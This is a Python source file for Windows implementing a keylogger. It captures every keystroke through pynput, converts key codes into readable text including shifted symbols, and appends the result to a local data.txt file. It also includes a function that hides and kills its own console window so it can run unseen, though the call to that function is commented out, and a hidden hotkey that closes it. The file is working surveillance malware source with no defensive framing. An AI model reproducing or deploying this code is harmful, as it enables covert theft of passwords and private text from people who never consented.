from pynput.keyboard import Key, KeyCode, Listener
import sys
import ctypes
import os
import win32process
import time

vk_to_str = {
    8: ' <back> ', 
    9: ' <tab> ',
    13: ' <enter> ',
    18: ' <alt> ',
    20: ' <caps> ',
    27: ' <esc> ',
    32: ' ',
    36: ' <home> ',
    37: ' <left-arr> ',
    38: ' <up-arr> ',
    39: ' <right-arr> ',
    40: ' <down-arr> ',
    44: ' <print-scr> ',
    46: ' <del> ',
    48: '0',
    49: '1',
    50: '2',
    51: '3',
    52: '4',
    53: '5',
    54: '6',
    55: '7',
    56: '8',
    57: '9',
    58: ':',
    60: '<',
    65: 'a',
    66: 'b',
    67: 'c',
    68: 'd',
    69: 'e',
    70: 'f',
    71: 'g',
    72: 'h',
    73: 'i',
    74: 'j',
    75: 'k',
    76: 'l',
    77: 'm',
    78: 'n',
    79: 'o',
    80: 'p',
    81: 'q',
    82: 'r',
    83: 's',
    84: 't',
    85: 'u',
    86: 'v',
    87: 'w',
    88: 'x',
    89: 'y',
    90: 'z',
    91: ' <left-win> ',
    92: ' <right-win> ',
    96: '0',
    97: '1',
    98: '2',
    99: '3',
    100: '4',
    101: '5',
    102: '6',
    103: '7',
    104: '8',
    105: '9',
    106: '*',
    107: '+',
    109: '-',
    110: '.',
    111: '/',
    112: ' <f1> ',
    113: ' <f2> ',
    114: ' <f3> ',
    115: ' <f4> ',
    116: ' <f5> ',
    117: ' <f6> ',
    118: ' <f7> ',
    119: ' <f8> ',
    120: ' <f9> ',
    121: ' <f10> ',
    122: ' <f11> ',
    123: ' <f12> ',
    144: ' <numlock> ',
    145: ' <scroll-lock> ',
    160: ' <shift> ',
    162: ' <ctrl-l> ',
    163: ' <ctrl-r> ',
    164: ' <alt-l> ',
    165: ' <alt-r> ',
    186: ';',
    187: '=',
    188: ',',
    190: '.',
    191: '/',
    192: '`',
    219: '[',
    220: '\\',
    221: ']',
    222: '\'',
    226: '\\',
}

alt_keys = {
    48: ')',
    49: '!',
    50: '@',
    51: '#',
    52: '$',
    53: '%',
    54: '^',
    55: '&',
    56: '*',
    57: '(',
    186: ':',
    187: '+',
    188: '<',
    190: '>',
    219: '{',
    220: '|',
    221: '}',
    222: '"',
    226: '|'
}

class KeyListener:
    def __init__(self):
        self.pressed_vks = []
        self.combination_to_function = {}


    def add_combination(self, hotkey, callback):
        self.combination_to_function[frozenset(hotkey)] = callback

    def listen(self, pressed_callback=print, released_callback=print):
        def on_press(key):
            vk = self.get_vk(key) 
            if vk not in self.pressed_vks:
                self.pressed_vks.append(vk) 

            pressed_callback(vk)

            for combination in self.combination_to_function:
                if self.is_combination_pressed(combination):  
                    self.combination_to_function[combination]()


        def on_release(key):
            vk = self.get_vk(key) 
            self.pressed_vks.remove(vk)

            released_callback(vk)

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    def get_vk(self, key):
        if hasattr(key, 'vk'):
            return key.vk
        return key.value.vk

    def is_combination_pressed(self, combination):
        for key in combination:
            if self.get_vk(key) not in self.pressed_vks:
                return False
        return True


class KeyLogger:
    def __init__(self):
        pass

    def listen(self):
        listener = KeyListener()

        def pressed_callback(vk):
            s = ' <' + str(vk) + '> '

            if vk in vk_to_str:
                s = vk_to_str[vk]

                if 160 in listener.pressed_vks:
                    if vk in alt_keys:
                        s = alt_keys[vk]
                    else:
                        s = s.capitalize()

            self.append_to_file('data.txt', s)

        listener.add_combination([Key.ctrl_l, Key.alt_l, KeyCode(vk=72)], self.close)
        listener.listen(pressed_callback=pressed_callback)

    def close(self):
        print('closing')
        sys.exit(0)

    def append_to_file(self, path, content):
        f = open(path, 'a')
        f.write(str(content))
        f.close()


def kill_console():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
    if hwnd != 0:      
        ctypes.windll.user32.ShowWindow(hwnd, 0)      
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        os.system('taskkill /PID ' + str(pid) + ' /f')


if __name__ == "__main__":
    #kill_console()
    KeyLogger().listen()
